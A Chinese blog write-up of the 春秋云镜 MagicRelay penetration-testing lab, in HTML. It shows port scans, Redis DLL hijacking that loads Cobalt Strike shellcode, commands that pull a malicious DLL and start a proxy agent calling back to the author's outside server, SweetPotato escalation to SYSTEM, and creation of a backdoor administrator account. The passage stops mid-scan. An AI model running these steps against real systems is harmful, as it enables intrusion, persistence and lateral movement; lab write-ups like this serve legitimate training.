@@ -1,0 +1,357 @@
+<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="Redis利用DLL劫持、向日葵RCE、CVE-2022-26923、Pass-The-Cert"><title>春秋云镜MagicRelay</title><link rel=canonical href=https://baozongwi.xyz/p/springautumn-cloudmirror-magicrelay/><link rel=stylesheet href=/scss/style.min.0fd9f1efab870423165ae7588bc203f4d3a9f9422c89352ef010f8c63e7225f0.css><meta property='og:title' content="春秋云镜MagicRelay"><meta property='og:description' content="Redis利用DLL劫持、向日葵RCE、CVE-2022-26923、Pass-The-Cert"><meta property='og:url' content='https://baozongwi.xyz/p/springautumn-cloudmirror-magicrelay/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Pentest'><meta property='article:published_time' content='2025-08-20T17:39:42+08:00'><meta property='article:modified_time' content='2025-08-20T17:39:42+08:00'><meta name=twitter:title content="春秋云镜MagicRelay"><meta name=twitter:description content="Redis利用DLL劫持、向日葵RCE、CVE-2022-26923、Pass-The-Cert"><link rel="shortcut icon" href=/logo.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1></div></header><ol class=menu-social><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=mailto:baozongwi@qq.com target=_blank title=Email rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-mail"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 7a2 2 0 012-2h14a2 2 0 012 2v10a2 2 0 01-2 2H5a2 2 0 01-2-2V7z"/><path d="M3 7l9 6 9-6"/></svg></a></li><li><a href=https://discord.com/users/1276595362970337414 target=_blank title=discord rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-discord"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M14 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M15.5 17c0 1 1.5 3 2 3 1.5.0 2.833-1.667 3.5-3 .667-1.667.5-5.833-1.5-11.5-1.457-1.015-3-1.34-4.5-1.5l-.972 1.923a11.913 11.913.0 00-4.053.0L9 4c-1.5.16-3.043.485-4.5 1.5-2 5.667-2.167 9.833-1.5 11.5.667 1.333 2 3 3.5 3 .5.0 2-2 2-3"/><path d="M7 16.5c3.5 1 6.5 1 10 0"/></svg></a></li><li><a href=https://www.yuque.com/baozongwi/kkn04k target=_blank title=travel rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-map-pin"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 11a3 3 0 106 0 3 3 0 00-6 0"/><path d="M17.657 16.657 13.414 20.9a2 2 0 01-2.827.0l-4.244-4.243a8 8 0 1111.314.0z"/></svg></a></li><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://www.travellings.cn/go.html target=_blank title=Travelling rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width=".5" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-tram-front-icon lucide-tram-front"><rect width="16" height="16" x="4" y="3" rx="2"/><path d="M4 11h16"/><path d="M12 3v8"/><path d="m8 19-2 3"/><path d="m18 22-2-3"/><path d="M8 15h.01"/><path d="M16 15h.01"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
+<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#说在前面>说在前面</a></li><li><a href=#flag1>flag1</a></li><li><a href=#flag2>flag2</a></li><li><a href=#flag4>flag4</a></li><li><a href=#flag3>flag3</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/>春秋云镜</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/springautumn-cloudmirror-magicrelay/>春秋云镜MagicRelay</a></h2><h3 class=article-subtitle>Redis利用DLL劫持、向日葵RCE、CVE-2022-26923、Pass-The-Cert</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2025-08-20T17:39:42+08:00>Aug 20, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>5 minute read</time></div></footer></div></header><section class=article-content><div class=outdated-notice><span class=outdated-notice__icon><svg class="icon icon-tabler icon-tabler-messages" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M21 14l-3-3h-7a1 1 0 01-1-1V4a1 1 0 011-1h9a1 1 0 011 1v10"/><path d="M14 15v2a1 1 0 01-1 1H6l-3 3V11a1 1 0 011-1h2"/></svg>
+</span><span>友情提示：本文最后更新于 176 天前，文中的内容可能已有所发展或发生改变。</span></div><h2 id=说在前面>说在前面</h2><p>最开始的redis入口，即使第一次劫持失败了，也依旧可以继续尝试，但是一旦成功了一次，如果选择下线就不能成功第二次了，并且其中修改shellcode前，产生项目的命令必须为</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>python DLLHijacker.py C:\Windows\System32\dbghelp.dll
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>python DLLHijacker.py dbghelp.dll
+</span></span></code></pre></td></tr></table></div></div><p>不能使用<code>Win11dbghelp.dll</code>等不规范的文件名，不然也会失败</p><h2 id=flag1>flag1</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root@iZ2vc00kcpt25b5vsbivjvZ:/var/www/html# ./fscan -h 39.99.238.25 -p 0-65535
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   ___                              _    
+</span></span><span class=line><span class=cl>  / _ <span class=se>\ </span>    ___  ___ _ __ __ _  ___<span class=p>|</span> <span class=p>|</span> __ 
+</span></span><span class=line><span class=cl> / /_<span class=se>\/</span>____/ __<span class=p>|</span>/ __<span class=p>|</span> <span class=err>&#39;</span>__/ _<span class=sb>`</span> <span class=p>|</span>/ __<span class=p>|</span> <span class=p>|</span>/ /
+</span></span><span class=line><span class=cl>/ /_<span class=se>\\</span>_____<span class=se>\_</span>_ <span class=se>\ </span><span class=o>(</span>__<span class=p>|</span> <span class=p>|</span> <span class=p>|</span> <span class=o>(</span>_<span class=p>|</span> <span class=p>|</span> <span class=o>(</span>__<span class=p>|</span>   &lt;    
+</span></span><span class=line><span class=cl><span class=se>\_</span>___/     <span class=p>|</span>___/<span class=se>\_</span>__<span class=p>|</span>_<span class=p>|</span>  <span class=se>\_</span>_,_<span class=p>|</span><span class=se>\_</span>__<span class=p>|</span>_<span class=p>|</span><span class=se>\_\ </span>  
+</span></span><span class=line><span class=cl>                     fscan version: 1.8.4
+</span></span><span class=line><span class=cl>start infoscan
+</span></span><span class=line><span class=cl>39.99.238.25:135 open
+</span></span><span class=line><span class=cl>39.99.238.25:139 open
+</span></span><span class=line><span class=cl>39.99.238.25:445 open
+</span></span><span class=line><span class=cl>39.99.238.25:3389 open
+</span></span><span class=line><span class=cl>39.99.238.25:6379 open
+</span></span><span class=line><span class=cl>39.99.238.25:15774 open
+</span></span><span class=line><span class=cl>39.99.238.25:47001 open
+</span></span><span class=line><span class=cl>39.99.238.25:49666 open
+</span></span><span class=line><span class=cl>39.99.238.25:49665 open
+</span></span><span class=line><span class=cl>39.99.238.25:49670 open
+</span></span><span class=line><span class=cl>39.99.238.25:49668 open
+</span></span><span class=line><span class=cl>39.99.238.25:49669 open
+</span></span><span class=line><span class=cl>39.99.238.25:49664 open
+</span></span><span class=line><span class=cl>39.99.238.25:49667 open
+</span></span><span class=line><span class=cl>39.99.238.25:49675 open
+</span></span><span class=line><span class=cl>39.99.238.25:49676 open
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> alive ports len is: <span class=m>16</span>
+</span></span><span class=line><span class=cl>start vulscan
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetInfo 
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>39.99.238.25
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>WIN-YUYAOX9Q
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>172.22.12.25
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> WebTitle http://39.99.238.25:47001 code:404 len:315    title:Not Found
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Redis 39.99.238.25:6379 unauthorized file:C:<span class=se>\P</span>rogram Files<span class=se>\R</span>edis/dump.rdb
+</span></span></code></pre></td></tr></table></div></div><p>扫描一下，发现redis服务，链接上去发现版本 <code>redis-cli -h 39.99.238.25</code>得到版本为3.0.504，这个版本是一般的Windows自带版本，可以查找资料</p><p><a class=link href=https://www.cnblogs.com/sup3rman/p/16803408.html target=_blank rel=noopener>https://www.cnblogs.com/sup3rman/p/16803408.html</a></p><p><a class=link href=https://xz.aliyun.com/news/13892 target=_blank rel=noopener>https://xz.aliyun.com/news/13892</a></p><p>第二篇文章简直和我们这里要打的场景那是一模一样，</p><p>VS2022 ：https://github.com/P4r4d1se/dll_hijack</p><p>VS2019 ： <a class=link href=https://github.com/kiwings/DLLHijacker target=_blank rel=noopener>https://github.com/kiwings/DLLHijacker</a></p><p>项目在这里，如果你是Windows11，那直接在本地的<code>C:\Windows\System32</code>下找到dbghelp.dll处理一下即可，如果你是Windows10，那你就要自己去找人要一个Windows11的，在Windows里面运行命令，不然生成出来的项目就会失败</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>python DLLHijacker.py C:\Windows\System32\dbghelp.dll
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>python DLLHijacker.py dbghelp.dll
+</span></span></code></pre></td></tr></table></div></div><p>用VS2022载入项目，会提示升级，点确认，靶机出网，准备上线CS，先生成shellcode</p><p><img src=/p/springautumn-cloudmirror-magicrelay/1.png width=351 height=186 loading=lazy alt=1></p><p><img src=/p/springautumn-cloudmirror-magicrelay/2.png width=2407 height=1422 loading=lazy alt=1></p><p>修改设置(先知那个BYD，他没写)，打开项目属性，</p><p>1、设置运行库为多线程 (/MT 或 /MTd)：</p><ul><li>在属性页面中，导航到：配置属性 > C/C++ > 代码生成。</li><li>找到 “运行库”（Runtime Library）选项。</li><li>如果当前是 Release 配置（截图中您已选择 Release x64），设置为 “多线程 (/MT)”。</li><li>如果是 Debug 配置，设置为 “多线程调试 (/MTd)”。</li><li>确保在顶部下拉菜单中选择正确的配置（Release 或 Debug）。</li></ul><p>2、禁用安全检查 (/GS)：</p><ul><li>仍在 配置属性 > C/C++ > 代码生成 页面。</li><li>找到 “安全检查”（Buffer Security Check）选项。</li><li>设置为 “禁用安全检查 (/GS-)”。</li></ul><p>3、关闭生成清单：</p><ul><li>导航到：配置属性 > 链接器 > 清单文件。</li><li>找到 “生成清单”（Generate Manifest）选项。</li><li>设置为 “否 (/MANIFEST:NO)”。</li></ul><p><img src=/p/springautumn-cloudmirror-magicrelay/3.png width=1200 height=818 loading=lazy alt=1></p><p><img src=/p/springautumn-cloudmirror-magicrelay/4.png width=1200 height=818 loading=lazy alt=1></p><p>应用，编译成dll文件即可</p><p><a class=link href=https://github.com/r35tart/RedisWriteFile target=_blank rel=noopener>https://github.com/r35tart/RedisWriteFile</a></p><p><a class=link href=https://github.com/0671/RabR target=_blank rel=noopener>https://github.com/0671/RabR</a></p><p>这两个项目都可以主从复制，去覆盖redis的DLL，达到劫持的效果，在服务器上面运行</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 RedisWriteFile.py --rhost 39.99.240.173 --rport <span class=m>6379</span> --lhost 47.109.176.117 --lport <span class=m>16379</span> --rpath <span class=s1>&#39;C:\\Program Files\\Redis\\&#39;</span> --rfile <span class=s1>&#39;dbghelp.dll&#39;</span> --lfile <span class=s1>&#39;dbghelp.dll&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># redis链接执行命令加载DLL</span>
+</span></span><span class=line><span class=cl>redis-cli -h 39.99.240.173
+</span></span><span class=line><span class=cl>bgsave
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/springautumn-cloudmirror-magicrelay/5.png width=1101 height=689 loading=lazy alt=1></p><p>或者是用RabR，我感觉这个更方便，可以直接上线</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 redis-attack.py -r 39.99.231.97 -L 47.109.176.117 -wf dbghelp.dll
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>h
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/springautumn-cloudmirror-magicrelay/6.png width=1011 height=510 loading=lazy alt=1></p><p>成功上线</p><p><img src=/p/springautumn-cloudmirror-magicrelay/7.png width=1511 height=744 loading=lazy alt=1></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>shell dir C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\f</span>lag<span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>
+</span></span><span class=line><span class=cl>shell <span class=nb>type</span> C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\f</span>lag<span class=se>\f</span>lag01.txt
+</span></span></code></pre></td></tr></table></div></div><p>这个用户就是域用户了</p><h2 id=flag2>flag2</h2><p>不是system权限，需要提权，上传甜土豆、beacon.exe和fscan.exe</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>shell dir C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\f</span>lag<span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>
+</span></span><span class=line><span class=cl>shell .<span class=se>\S</span>weetPotato.exe._obf.exe -a <span class=s2>&#34;whoami&#34;</span>
+</span></span><span class=line><span class=cl>shell C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\f</span>lag<span class=se>\S</span>weetPotato.exe._obf.exe -a C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\f</span>lag<span class=se>\b</span>eacon.exe
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/springautumn-cloudmirror-magicrelay/8.png width=556 height=226 loading=lazy alt=1></p><p>成功上线system，直接新建用户RDP上去</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>shell net user test1 baozongwi123! /add
+</span></span><span class=line><span class=cl>shell net localgroup administrators test1 /add
+</span></span></code></pre></td></tr></table></div></div><p>上传stowaway搭建代理</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>./linux_x64_admin -l <span class=m>2334</span> -s <span class=m>123</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>.<span class=se>\w</span>indows_x64_agent.exe -c 47.109.176.117:2334 -s <span class=m>123</span> --reconnect <span class=m>8</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>use <span class=m>0</span>
+</span></span><span class=line><span class=cl>socks <span class=m>5555</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>sudo vim /etc/proxychains4.conf
+</span></span></code></pre></td></tr></table></div></div><p>扫描一下这个网段</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ipconfig
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\f</span>lag&gt;.<span class=se>\f</span>scan.exe -h 172.22.12.25/24
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   ___                              _
+</span></span><span class=line><span class=cl>  / _ <span class=se>\ </span>    ___  ___ _ __ __ _  ___<span class=p>|</span> <span class=p>|</span> __
+</span></span><span class=line><span class=cl> / /_<span class=se>\/</span>____/ __<span class=p>|</span>/ __<span class=p>|</span> <span class=err>&#39;</span>__/ _<span class=sb>`</span> <span class=p>|</span>/ __<span class=p>|</span> <span class=p>|</span>/ /
+</span></span><span class=line><span class=cl>/ /_<span class=se>\\</span>_____<span class=se>\_</span>_ <span class=se>\ </span><span class=o>(</span>__<span class=p>|</span> <span class=p>|</span> <span class=p>|</span> <span class=o>(</span>_<span class=p>|</span> <span class=p>|</span> <span class=o>(</span>__<span class=p>|</span>   &lt;
+</span></span><span class=line><span class=cl><span class=se>\_</span>___/     <span class=p>|</span>___/<span class=se>\_</span>__<span class=p>|</span>_<span class=p>|</span>  <span class=se>\_</span>_,_<span class=p>|</span><span class=se>\_</span>__<span class=p>|</span>_<span class=p>|</span><span class=se>\_\
+</span></span></span><span class=line><span class=cl><span class=se></span>                     fscan version: 1.8.4
+</span></span><span class=line><span class=cl>start infoscan
+</span></span><span class=line><span class=cl><span class=o>(</span>icmp<span class=o>)</span> Target 172.22.12.6     is alive
+</span></span><span class=line><span class=cl><span class=o>(</span>icmp<span class=o>)</span> Target 172.22.12.12    is alive
+</span></span><span class=line><span class=cl><span class=o>(</span>icmp<span class=o>)</span> Target 172.22.12.25    is alive
+</span></span><span class=line><span class=cl><span class=o>(</span>icmp<span class=o>)</span> Target 172.22.12.31    is alive
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Icmp alive hosts len is: <span class=m>4</span>
+</span></span><span class=line><span class=cl>172.22.12.6:88 open
+</span></span><span class=line><span class=cl>172.22.12.25:6379 open
+</span></span><span class=line><span class=cl>172.22.12.31:445 open
+</span></span><span class=line><span class=cl>172.22.12.25:445 open
+</span></span><span class=line><span class=cl>172.22.12.12:445 open
+</span></span><span class=line><span class=cl>172.22.12.6:445 open
+</span></span><span class=line><span class=cl>172.22.12.31:139 open
+</span></span><span class=line><span class=cl>172.22.12.25:139 open
+</span></span><span class=line><span class=cl>172.22.12.12:139 open
+</span></span><span class=line><span class=cl>172.22.12.6:139 open
+</span></span><span class=line><span class=cl>172.22.12.31:135 open
+</span></span><span class=line><span class=cl>172.22.12.6:135 open
+</span></span><span class=line><span class=cl>172.22.12.12:135 open
+</span></span><span class=line><span class=cl>172.22.12.25:135 open
+</span></span><span class=line><span class=cl>172.22.12.31:80 open
+</span></span><span class=line><span class=cl>172.22.12.12:80 open
+</span></span><span class=line><span class=cl>172.22.12.31:21 open
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> alive ports len is: <span class=m>17</span>
+</span></span><span class=line><span class=cl>start vulscan
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetInfo
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>172.22.12.25
